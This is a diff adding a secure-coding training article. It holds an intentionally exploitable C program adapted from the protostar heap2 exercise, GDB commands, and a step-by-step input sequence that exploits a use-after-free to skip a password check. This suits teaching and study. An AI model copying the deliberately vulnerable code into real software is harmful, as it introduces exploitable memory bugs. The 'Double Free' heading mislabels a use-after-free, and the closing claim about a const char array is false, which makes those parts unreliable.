@@ -1,0 +1,154 @@
+---
+title: 'C Vulnerability Walkthroughs'
+series: 'Articles'
+---
+
+# <%= current_page.data.title %>
+ 
+{::options parse_block_html="true"/}
+<div class="toc">
+<nav>
+  <h4>Table of Contents</h4>
+  * this unordered seed list will be replaced by toc as unordered list
+  {:toc}
+</nav>
+</div>
+{::options parse_block_html="false"/}
+
+
+## Intro
+
+This article is a collection of textbook c vulnerabilities along with debugging commands and exploit. I prepared the content as source for secure coding and security awareness type courses, so see it as example collection and not as tutorial.
+
+
+## Using GDB
+
+#### Setting disassembly to intel.
+
+```bash
+echo 'set disassembly-flavor intel' > ~/.gdbinit
+```
+
+#### Important commands
+
+| info break | list breakpoint |
+| del 1 | delete bnreakpoint # |
+| command # | run a set of commands on breakpoint # |
+| print # | print variable,.. required debugging symbols (gcc -g) | 
+| x <address> | display memory content |
+| x/20w <address> | display 20 words (64bit on an x86-64)| 
+| x/20w <address>-# | display 20 words at address-#| 
+ 
+
+## Double Free
+
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+ 
+// Use after free, adapted from protostar/heap2 https://exploit.education
+// - fixed the bug where the auth/malloc was using the wrong size
+// - changed strdup to malloc/strcpy to keep it exploitable
+
+#define SERVICE_SIZE 32
+
+struct AuthStruct {
+  char name[32];
+  int is_authenticated;
+};
+
+
+struct AuthStruct *auth;
+char *service;
+
+int main(int argc, char **argv)
+{
+  char line[128];
+
+  while(1) {
+    printf("[ auth = %p, service = %p ]\n", auth, service);
+
+    if(fgets(line, sizeof(line), stdin) == NULL) break;
+    
+    if(strncmp(line, "user ", 5) == 0) {
+      auth = malloc(sizeof(*auth));
+      memset(auth, 0, sizeof(*auth));
+      if(strlen(line + 5) < 31) {
+        strcpy(auth->name, line + 5);
+      }
+    }
+    if(strncmp(line, "reset", 5) == 0) {
+      free(auth);
+    }
+    if(strncmp(line, "service", 6) == 0) {
+      service = malloc(SERVICE_SIZE);
+      strcpy(service, line+7);
+    }
+    if(strncmp(line, "login", 5) == 0) {
+      if(auth->is_authenticated) {
+        printf("you have logged in already!\n");
+      } else {
+        printf("please enter your password\n");
+      }
+    }
+  }
+}
+
+```
+
+Compile with symbols and run in gdb:
+
+```bash
+gcc -g heap2.c -o heap2
+gdb ./heap2
+```
+
+
+| r, user test, ctrl-c | run program, get auth allocated, break into gdb |
+| info proc mapping |  show memory layout including heap address |
+| x/20 <heap address> | we don't really need this, using the variable is easier |
+| print auth | show pointer, not really useful but also show the heap location |
+| print *auth | print auth structure | 
+| x/40wx auth-1 | the main command to view the correct place on the heap |
+| Note | "auth-1" is substracting 1 of sizeof(*auth) | 
+| x/40wx (char*)auth-16 | This makes it clearer what is actually being substracted | 
+| disas main | look at source for breakpoint location |
+| break *(main+56) | break on printf |
+|||
+| command | add command(s) to breakpoint |
+| x/40wx auth-1 | This is the important information, you could also print auth and/or service | 
+| echo ---\n | if printing multiple things, echo can be used to add text and line breaks |
+| continue | continue execution automatically |
+| end | end the command statement |
+| r | restart and start hacking |
+| The "text book" way to hack the code  is:||
+| user test |  test shows up in heap|
+| service AAAA | AAAA shows up further down in the heap | 
+| reset | auth is freed |
+| service AAAA | AAAA shows up in the location previously used by auth |
+| login | we still need a password |
+| r | second attempt |
+| user test, reset |
+| service AA[...]A | eventually the position of is_authenticated gets overwritten |
+| login | and we don't need a password any more |
+
+<%= img_frame('img/heap2.png', 'Exploiting the use after free', '1000px') %>
+ 
+Bonus point if you can explain what happens to the username string upon calling reset. 
+
+
+## Buffer Underflow
+
+
+## Misleading C Code examples
+
+
+```c
+const char my_constant_string[] = "Welcome to C";
+```
+
+Will create a constant string pointer, pointing to a changeable string.
